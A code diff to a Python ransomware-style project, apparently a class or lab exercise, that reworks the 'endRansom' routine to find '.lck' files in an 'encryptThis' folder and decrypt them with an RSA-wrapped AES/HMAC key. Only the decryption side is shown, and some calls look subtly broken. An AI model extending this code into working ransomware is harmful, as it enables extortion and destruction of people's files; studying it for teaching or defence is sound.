@@ -1,4 +1,4 @@
-import os, base64, constants
+import os, base64, constants, json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac, serialization, asymmetric
@@ -101,7 +101,7 @@ def myFileDecryptMAC(file_path, enc_key, hmac_key, iv, tag):
 			file.write(plainTextFile)
 			file.close()
 
-def myRSADecrypt (RSACipher, C, iv, tag, ext, RSA_Privatekey_filepath):
+def myRSADecrypt (RSACipher, file_path, iv, tag, ext, RSA_Privatekey_filepath):
 	hmac_key = ""
 	enc_key = ""
 	key = ""
@@ -128,18 +128,34 @@ def myRSADecrypt (RSACipher, C, iv, tag, ext, RSA_Privatekey_filepath):
 			hmac_key = key[hmac_key_start:hmac_key_end]
 			key_file.close()
 
-		myFileDecryptMAC(C, enc_key, hmac_key, iv, tag)
+		myFileDecryptMAC(file_path, enc_key, hmac_key, iv, tag)
 
 	else:
 		print("Private key not found!\nDecryption failed.")
 
 def endRansom():
-	for dirName, subDirList, fileList in os.walk(os.getcwd()):
+	keyFolder = os.path.join(os.getcwd(),"keys")
+	privateKeyPath = os.path.join(keyFolder, "private_key")
+
+	for dirName, subDirList, fileList in os.walk('encryptThis'):
+		print('Found directory: %s' % dirName)
 		for fileName in fileList:
-			print(fileName)
-			with open(fileName) as json_file:
-				data = json.load(json_file)
-				print(data)
+			name, ext = os.path.splitext(fileName)
+			if(ext == '.lck'):
+				file = os.path.join(dirName, fileName)
+
+				with open(file) as json_file:
+					try:
+						data = json.load(json_file)
+						print("BASE " + base64.b64encode(data['RSACipher']))
+						myRSADecrypt(
+							base64.b64encode(data['RSACipher']), 
+							file,
+							base64.b64encode(data['iv']), 
+							base64.b64encode(data['tag']), 
+							base64.b64encode(data['fileExt']), privateKeyPath)
+					except Exception as e:
+						print(e) 
 
 # Here we remove the padding
 def removePadding(padded_encoded):
